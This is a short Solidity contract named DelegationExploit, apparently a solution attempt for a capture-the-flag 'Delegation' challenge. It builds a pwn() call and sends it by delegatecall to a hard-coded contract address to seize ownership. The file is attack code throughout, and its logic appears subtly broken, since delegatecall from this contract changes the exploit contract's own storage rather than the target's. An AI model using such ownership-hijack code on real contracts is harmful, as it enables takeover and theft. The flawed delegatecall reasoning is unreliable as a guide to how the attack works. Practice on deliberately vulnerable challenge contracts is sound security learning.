pragma solidity ^0.8.0;

contract DelegationExploit {
    event Response(bool success, bytes data);

    function getSig() public pure returns (bytes memory) {
        return abi.encodeWithSignature("pwn()");
    }

    function exploit() public {
        address delegationContract = 0x37f1d6aF4A60adF18850BBC42B2591E58C160384;

        (bool success, bytes memory data) = delegationContract.delegatecall(
            getSig()
        );

        emit Response(success, data);
    }
}
